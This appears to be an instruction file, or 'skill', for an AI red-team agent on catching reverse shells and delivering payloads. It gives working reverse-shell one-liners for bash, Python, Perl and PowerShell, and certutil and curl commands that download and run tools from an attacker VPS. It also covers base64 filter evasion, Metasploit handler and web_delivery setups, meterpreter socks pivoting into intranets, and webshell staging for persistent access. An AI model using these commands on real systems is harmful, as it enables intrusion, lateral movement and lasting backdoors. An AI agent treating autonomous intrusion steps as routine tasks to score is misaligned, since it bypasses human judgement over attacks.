---
name: shell-handler
description: [Access] Reverse shell and payload delivery: start MSF/nc/socat listeners on the VPS to catch shells, or pull payloads from the target for staging
whenToUse: When RCE/command execution needs to call back, follow-on payloads must be delivered, or one-shot command execution must become an interactive session
role: exploit
category: Access
tags: [shell, session, handler]
enabled: true
---

# Reverse Shell and Payload Delivery (obtaining a callback session)

> **Load the VPS configuration first**: every `$REDTEAM_VPS_HOST` / `$VPS_USER` in this skill comes from local configuration,
> read from `$DSH_HOME/.env`. Source it before each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> Tools are prepared by the user; this skill does not provide downloads, install scripts or tutorials.

**Command execution ≠ session**. A one-shot `?cmd=whoami` only proves a hole exists; it cannot sustain operations. This skill turns "can execute commands"
into a **stable, interactive, reusable** callback session, and delivers follow-on payloads (webshells, tunnels, scanners).

## Local infrastructure

| Item | Value |
| --- | --- |
| VPS | `$REDTEAM_VPS_HOST` (SSH port 22, private key `$DSH_HOME/redteam/toolkit/vps/id_rsa`) |
| Payload distribution | `http://$REDTEAM_VPS_HOST:9100/` (fscan/gogo/Behinder shell/Godzilla shell already synced) |
| Listener port range | `9000-9999` |
| Session management | `tmux` (listeners must run inside tmux, otherwise they die on disconnect) |
| Local tools | `nc`, `socat`, `msfconsole` 6.5.3 (`exploit/multi/handler`, `exploit/multi/script/web_delivery` verified present) |

Companion skills: `vps-reverse-shell` (concrete operations for VPS login and listeners), `webshell-toolkit` (staging Behinder/Godzilla shells).

## 1. Choosing: which one to use when

| Scenario | Usage |
| --- | --- |
| **Temporary validation** (just run one command and see output) | `nc -lvnp <port>` + target-side bash/python reverse shell — good enough, move on |
| **Long-term operation / file transfer / tunneling** (**the workhorse**) | **MSF `multi/handler`** (auto-reconnect, upgradeable to meterpreter, can open socks) |
| **Target can only egress HTTP(S)** | `web_delivery` (MSF generates a one-liner; the target pulls the payload itself) |
| **Windows target, needs reliability** | MSF handler + `shell_to_meterpreter` upgrade |
| **Need to proxy intranet traffic back** | After getting a shell **do not** use the shell as a proxy; stage a WebShell → `suo5-tunnel` (see skill) |

## 2. MSF handler (recommended workhorse)

```bash
# 1) Start the listener inside tmux on the VPS (local machine or VPS both work, depending on callback direction)
tmux new -s handler
msfconsole -q

msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp   # Windows: windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9001
msf6 > set ExitOnSession false      # key: do not exit when a session drops, keep waiting for reconnects
msf6 > exploit -j                    # background listener
```

**Confirm the port is free before starting the listener**: `ss -lntp | grep 9001`; the VPS security group must allow that port.

Complete chain example for one-shot delivery and catching a session:
```bash
# Target side (assuming a command execution point exists)
bash -c 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1'
# Use another one-liner when bash is absent (see table below)
```

## 3. Reverse shell one-liners per language (choose per target environment)

```bash
# Linux - bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
# Linux - no bash (sh + nc)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
# Linux - python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
# Linux - perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# Windows - powershell (mind escaping and execution policy)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
# Windows - download a payload with certutil then execute
certutil -urlcache -split -f http://$REDTEAM_VPS_HOST:9100/fscan.exe C:\Windows\Temp\f.exe && C:\Windows\Temp\f.exe -h 10.0.0.0/24
# Linux - download a payload with curl/wget
curl -s http://$REDTEAM_VPS_HOST:9100/gogo -o /tmp/gogo && chmod +x /tmp/gogo && /tmp/gogo -i 10.0.0.0/24 -m ss
```

**Encoding bypass**: when spaces/quotes in the command are blocked, base64-encode it and decode on the target:
```bash
# Generate (local machine)
echo -n 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1' | base64 -w0
# Execute on the target
echo <BASE64> | base64 -d | bash
```

## 4. MSF web_delivery (when only HTTP egress is possible)

```bash
msf6 > use exploit/multi/script/web_delivery
msf6 > set target 7              # 7 = Linux Python (run show targets first to see the list)
msf6 > set payload python/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9002
msf6 > exploit -j
# MSF prints a one-liner (of the form python -c "import urllib.request;..."),
# deliver it to the target's command execution point → the target pulls the payload → the session is established
```

## 5. Upgrade and maintenance

```bash
# Upgrade a shell to meterpreter (enables socks, file transfer, privilege escalation)
msf6 > sessions -l
msf6 > sessions -u <id>            # or use post/multi/manage/shell_to_meterpreter

# Open an intranet socks proxy through meterpreter
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > exploit -j
# After that, point proxychains at 127.0.0.1:1080 to reach the intranet
```
> ⚠️ Scoring criteria: **a proxy running only on your own VPS does not count as a tunnel**. Intranet targets reached through
> meterpreter autoroute belong to `entry_kind=target-agent` (forwarded via a controlled process on the target); when registering
> `redteam_tunnel_add` you must state which side is the target side.

## 6. Discipline (mandatory)

1. **Listeners must run inside tmux**: an SSH disconnect kills the listener and the session is lost. `tmux new -s handler` / `tmux a -t handler`.
2. **Probe port occupancy first**, and allow the port in the VPS security group; do not run too many listeners on one machine (use the 9000-9999 range in order).
3. **A reverse shell is "the target dialing out"**: when target egress is restricted, try HTTP(S) egress first (80/443/8080);
   if there is no egress at all, only WebShell + tunnel (`suo5-tunnel`) remains.
4. **Do not run payloads that restart services on production systems**; for privilege escalation/kernel-exploit style operations, assess restart risk first.
5. **Sessions must be registered**: once you have a shell, call `redteam_session_check` immediately so it can be used later; see `redteam_tunnel_add` for tunnel registration.

## 7. Output and persistence (mandatory)

1. **Score immediately upon obtaining a callback session**: `redteam_score_hit` (`server-host` / `server-host`); `evidence` written as "asset | shell type and privilege" (e.g. `10.0.0.5｜root shell (uid=0)`).
2. **Persist the session**: `redteam_access_add` (`method=reverse-shell`, clearly stating `target`, `user`, `privilege`, listener address and port).
3. **Persist the tunnel** (if the intranet was reached through it): `redteam_tunnel_add`, where `entry_kind` must state the target side
   (`target-outbound`=target calls back / target runs the frp client, `target-http`=suo5 through the target WebShell, `target-agent`=forwarded via a controlled process on the target),
   then `redteam_session_check` to test connectivity for real.
4. When scoring, put the actual command/output into the `command`/`result` of `redteam_score_hit`; there is no need to write a separate chain.
   `tool` holds **the actual command text** (including the full reverse shell command or MSF configuration), `result` holds the output summary (e.g. `uid=0(root) gid=0(root)`).
5. **Deliver an entry point the user can reuse**: prefer staging **a Behinder shell/Godzilla shell** (skill `webshell-toolkit`) — the user can connect and operate directly from the console;
   for temporary reverse sessions state clearly "this is a one-off session, not a delivered entry point".
